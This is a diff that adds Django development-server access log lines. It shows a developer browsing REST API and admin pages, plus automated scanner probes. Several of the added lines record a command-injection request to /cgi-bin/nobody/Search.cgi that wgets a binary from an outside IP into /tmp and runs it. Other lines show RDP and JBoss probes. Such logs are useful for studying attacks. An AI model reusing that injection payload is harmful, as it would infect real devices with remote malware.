@@ -175,3 +175,232 @@ Not Found: /api/admin
 [11/Oct/2018 22:17:41] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 128820
 [11/Oct/2018 22:17:41] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
 [11/Oct/2018 22:17:42] "GET /admin/ HTTP/1.1" 200 3699
+[11/Oct/2018 22:42:40] "GET /api/ HTTP/1.1" 200 5320
+[11/Oct/2018 22:42:41] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0
+[11/Oct/2018 22:42:41] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
+[11/Oct/2018 22:42:41] "GET /static/rest_framework/js/jquery-3.3.1.min.js HTTP/1.1" 304 0
+[11/Oct/2018 22:42:41] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0
+[11/Oct/2018 22:42:41] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0
+[11/Oct/2018 22:42:41] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0
+[11/Oct/2018 22:42:41] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
+[11/Oct/2018 22:42:41] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
+[11/Oct/2018 22:42:41] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
+[11/Oct/2018 22:42:41] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0
+[11/Oct/2018 22:42:41] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0
+Not Found: /api/Person
+[11/Oct/2018 22:43:28] "GET /api/Person HTTP/1.1" 404 3921
+[11/Oct/2018 22:43:36] "GET /api/person/ HTTP/1.1" 200 7925
+[11/Oct/2018 22:43:36] "GET /static/rest_framework/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 304 0
+Not Found: /api/peon/
+[11/Oct/2018 22:43:51] "GET /api/peon/ HTTP/1.1" 404 3918
+Not Found: /api/person/1/
+[11/Oct/2018 22:44:19] "GET /api/person/1/ HTTP/1.1" 404 7711
+[11/Oct/2018 22:44:30] "GET /api/person/ HTTP/1.1" 200 7925
+[11/Oct/2018 22:44:58] "GET /admin/ HTTP/1.1" 200 3699
+[11/Oct/2018 22:44:58] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[11/Oct/2018 22:44:58] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
+[11/Oct/2018 22:44:58] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[11/Oct/2018 22:44:58] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[11/Oct/2018 22:44:58] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[11/Oct/2018 22:44:58] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[11/Oct/2018 22:44:58] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[11/Oct/2018 22:44:58] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[11/Oct/2018 22:44:58] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[11/Oct/2018 22:45:00] "GET /admin/api/person/add/ HTTP/1.1" 200 6442
+[11/Oct/2018 22:45:00] "GET /static/admin/css/forms.css HTTP/1.1" 200 8505
+[11/Oct/2018 22:45:00] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[11/Oct/2018 22:45:00] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[11/Oct/2018 22:45:00] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[11/Oct/2018 22:45:00] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
+[11/Oct/2018 22:45:00] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[11/Oct/2018 22:45:00] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[11/Oct/2018 22:45:00] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[11/Oct/2018 22:45:00] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[11/Oct/2018 22:45:00] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[11/Oct/2018 22:45:00] "GET /static/admin/js/change_form.js HTTP/1.1" 200 712
+[11/Oct/2018 22:45:00] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 495
+[11/Oct/2018 22:45:00] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10340
+[11/Oct/2018 22:45:43] "POST /admin/api/person/add/ HTTP/1.1" 302 0
+[11/Oct/2018 22:45:43] "GET /admin/api/person/ HTTP/1.1" 200 4517
+[11/Oct/2018 22:45:44] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
+[11/Oct/2018 22:45:44] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
+[11/Oct/2018 22:45:44] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 304 0
+[11/Oct/2018 22:45:44] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
+[11/Oct/2018 22:45:56] "GET /api/person/ HTTP/1.1" 200 8510
+[11/Oct/2018 22:46:16] "GET /api/person/1/ HTTP/1.1" 200 5686
+[12/Oct/2018 00:25:02] "GET / HTTP/1.1" 200 1258
+[12/Oct/2018 00:25:35] "GET /api/person/1/ HTTP/1.1" 200 197
+[12/Oct/2018 00:26:23] "GET / HTTP/1.1" 200 1258
+[12/Oct/2018 00:26:23] "GET /api/person/1/ HTTP/1.1" 200 197
+[12/Oct/2018 00:26:28] "GET /api/ HTTP/1.1" 200 5320
+[12/Oct/2018 00:26:28] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0
+[12/Oct/2018 00:26:28] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
+[12/Oct/2018 00:26:28] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0
+[12/Oct/2018 00:26:28] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0
+[12/Oct/2018 00:26:28] "GET /static/rest_framework/js/jquery-3.3.1.min.js HTTP/1.1" 304 0
+[12/Oct/2018 00:26:28] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0
+[12/Oct/2018 00:26:29] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
+[12/Oct/2018 00:26:29] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
+[12/Oct/2018 00:26:29] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0
+[12/Oct/2018 00:26:29] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
+[12/Oct/2018 00:26:29] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0
+[12/Oct/2018 00:26:37] "GET /admin/ HTTP/1.1" 200 4024
+[12/Oct/2018 00:26:38] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[12/Oct/2018 00:26:38] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
+[12/Oct/2018 00:26:38] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[12/Oct/2018 00:26:38] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[12/Oct/2018 00:26:38] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[12/Oct/2018 00:26:38] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[12/Oct/2018 00:26:38] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[12/Oct/2018 00:26:38] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[12/Oct/2018 00:26:39] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[12/Oct/2018 00:26:44] "GET /admin/auth/group/ HTTP/1.1" 200 3505
+[12/Oct/2018 00:26:44] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
+[12/Oct/2018 00:26:48] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[12/Oct/2018 00:26:48] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
+[12/Oct/2018 00:26:48] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[12/Oct/2018 00:26:48] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[12/Oct/2018 00:26:49] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[12/Oct/2018 00:26:49] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[12/Oct/2018 00:26:49] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[12/Oct/2018 00:26:49] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[12/Oct/2018 00:26:49] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[12/Oct/2018 00:26:49] "GET /static/admin/img/search.svg HTTP/1.1" 200 458
+[12/Oct/2018 00:26:50] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 304 0
+[12/Oct/2018 00:26:51] "GET /admin/ HTTP/1.1" 200 4024
+[12/Oct/2018 00:26:57] "GET /admin/auth/group/ HTTP/1.1" 200 3505
+[12/Oct/2018 00:26:57] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
+[12/Oct/2018 00:26:59] "GET /admin/ HTTP/1.1" 200 4024
+[12/Oct/2018 00:27:01] "GET /admin/auth/user/ HTTP/1.1" 200 6618
+[12/Oct/2018 00:27:01] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
+[12/Oct/2018 00:27:02] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 304 0
+[12/Oct/2018 00:27:02] "GET /static/admin/img/sorting-icons.svg HTTP/1.1" 200 1097
+[12/Oct/2018 00:27:07] "GET /admin/ HTTP/1.1" 200 4024
+[12/Oct/2018 00:31:10] "GET /api/person/ HTTP/1.1" 200 8510
+[12/Oct/2018 00:31:10] "GET /static/rest_framework/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 304 0
+Invalid HTTP_HOST header: 'testing2:8000'. You may need to add 'testing2' to ALLOWED_HOSTS.
+Bad Request: /
+[12/Oct/2018 03:05:20] "GET / HTTP/1.0" 400 60241
+[12/Oct/2018 15:42:24] "GET / HTTP/1.1" 200 1258
+Not Found: /favicon.ico
+[12/Oct/2018 17:29:19] "GET /favicon.ico HTTP/1.1" 404 2549
+[12/Oct/2018 17:29:32] "GET /admin/ HTTP/1.1" 200 4024
+[12/Oct/2018 20:05:33] "GET / HTTP/1.1" 200 1258
+Not Found: /favicon.ico
+[12/Oct/2018 20:05:34] "GET /favicon.ico HTTP/1.1" 404 2549
+[12/Oct/2018 20:40:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[12/Oct/2018 20:40:04] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: 'testing2:8000'. You may need to add 'testing2' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Oct/2018 10:49:56] "GET / HTTP/1.0" 400 60241
+[13/Oct/2018 16:16:21] "GET / HTTP/1.1" 200 1258
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/home/ubuntu/A3/env/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.5/socket.py", line 575, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[13/Oct/2018 19:54:53] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[13/Oct/2018 19:54:53] "  *%à     Cookie: mstshash=Test" 400 -
+[13/Oct/2018 19:54:53] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[13/Oct/2018 19:54:53] "  *%à     Cookie: mstshash=Test" 400 -
+Invalid HTTP_HOST header: 'testing2:8000'. You may need to add 'testing2' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Oct/2018 04:26:01] "GET / HTTP/1.0" 400 60241
+[14/Oct/2018 08:15:56] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[14/Oct/2018 08:15:56] "    c                           " 400 -
+[14/Oct/2018 15:59:18] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[14/Oct/2018 15:59:18] "  /*à     Cookie: mstshash=Administr" 400 -
+[15/Oct/2018 08:53:33] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[15/Oct/2018 08:53:33] "    c                           " 400 -
+[15/Oct/2018 10:38:10] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
+[15/Oct/2018 10:38:10] "  +&à     Cookie: mstshash=hello" 400 -
+[15/Oct/2018 11:07:08] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[15/Oct/2018 11:07:08] "    c                           " 400 -
+[15/Oct/2018 12:35:48] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[15/Oct/2018 12:35:48] "    c                           " 400 -
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/home/ubuntu/A3/env/lib/python3.5/site-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.5/socket.py", line 575, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[15/Oct/2018 22:10:29] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[15/Oct/2018 22:10:29] "  *%à     Cookie: mstshash=Test" 400 -
+[15/Oct/2018 22:10:30] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[15/Oct/2018 22:10:30] "  *%à     Cookie: mstshash=Test" 400 -
+[15/Oct/2018 23:24:35] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[15/Oct/2018 23:24:35] "  /*à     Cookie: mstshash=Administr" 400 -
+[16/Oct/2018 02:56:21] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[16/Oct/2018 02:56:21] "    c                           " 400 -
+[16/Oct/2018 04:11:31] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x80\x0b¨À\x00\x0c)t F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
+[16/Oct/2018 04:11:31] "   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      " 400 -
+Invalid HTTP_HOST header: 'testing2:8000'. You may need to add 'testing2' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[16/Oct/2018 08:07:47] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64476
+[16/Oct/2018 10:24:07] "GET / HTTP/1.1" 200 1258
+Invalid HTTP_HOST header: 'testing2:8000'. You may need to add 'testing2' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[16/Oct/2018 13:48:03] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64476
+[16/Oct/2018 20:14:09] "GET / HTTP/1.1" 200 1258
+Invalid HTTP_HOST header: 'testing2:8000'. You may need to add 'testing2' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[16/Oct/2018 20:33:09] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64477
+[16/Oct/2018 21:36:10] "GET / HTTP/1.1" 200 1258
+Invalid HTTP_HOST header: 'testing2:8000'. You may need to add 'testing2' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[17/Oct/2018 00:41:53] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64475
+Not Found: /verifylogin.do
+[17/Oct/2018 06:09:11] "GET /verifylogin.do HTTP/1.1" 404 2558
+Not Found: /invoker/readonly
+[17/Oct/2018 06:09:11] "GET /invoker/readonly HTTP/1.1" 404 2564
+Not Found: /indexweb4.jsp/
+[17/Oct/2018 06:09:12] "PUT /indexweb4.jsp/ HTTP/1.1" 404 2558
+[17/Oct/2018 06:09:13] "GET / HTTP/1.1" 200 1258
+Invalid HTTP_HOST header: 'testing2:8000'. You may need to add 'testing2' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[17/Oct/2018 07:23:07] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64477
+[17/Oct/2018 09:35:33] "GET / HTTP/1.1" 200 1258
+Not Found: /favicon.ico
+[17/Oct/2018 09:35:35] "GET /favicon.ico HTTP/1.1" 404 2549
+Invalid HTTP_HOST header: 'testing2:8000'. You may need to add 'testing2' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/nobody/Search.cgi
+[17/Oct/2018 10:31:38] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 64477
+[17/Oct/2018 12:30:43] "GET / HTTP/1.1" 200 1258
+[17/Oct/2018 12:30:43] "GET / HTTP/1.1" 200 1258
+[17/Oct/2018 12:30:44] "GET / HTTP/1.1" 200 1258
+Invalid HTTP_HOST header: 'testing2:8000'. You may need to add 'testing2' to ALLOWED_HOSTS.
+Bad Request: /
+[17/Oct/2018 13:46:54] "GET / HTTP/1.0" 400 60242
+[17/Oct/2018 19:28:16] "GET / HTTP/1.1" 200 1258
+Not Found: /favicon.ico
+[17/Oct/2018 19:28:17] "GET /api/person/1/ HTTP/1.1" 200 197
+[17/Oct/2018 19:28:17] "GET /favicon.ico HTTP/1.1" 404 2549
+[17/Oct/2018 19:28:29] "GET /admin HTTP/1.1" 301 0
+[17/Oct/2018 19:28:29] "GET /admin/ HTTP/1.1" 302 0
+[17/Oct/2018 19:28:29] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
+[17/Oct/2018 19:28:29] "GET /static/admin/css/base.css HTTP/1.1" 200 16225
+[17/Oct/2018 19:28:29] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
+[17/Oct/2018 19:28:29] "GET /static/admin/css/responsive.css HTTP/1.1" 200 17976
+[17/Oct/2018 19:28:29] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[17/Oct/2018 19:28:29] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
+[17/Oct/2018 19:28:29] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
+[17/Oct/2018 19:28:34] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[17/Oct/2018 19:28:34] "GET /admin/ HTTP/1.1" 200 4024
+[17/Oct/2018 19:28:34] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 412
+[17/Oct/2018 19:28:34] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
+[17/Oct/2018 19:28:34] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[17/Oct/2018 19:28:34] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[17/Oct/2018 19:32:13] "GET /admin/ HTTP/1.1" 200 4024
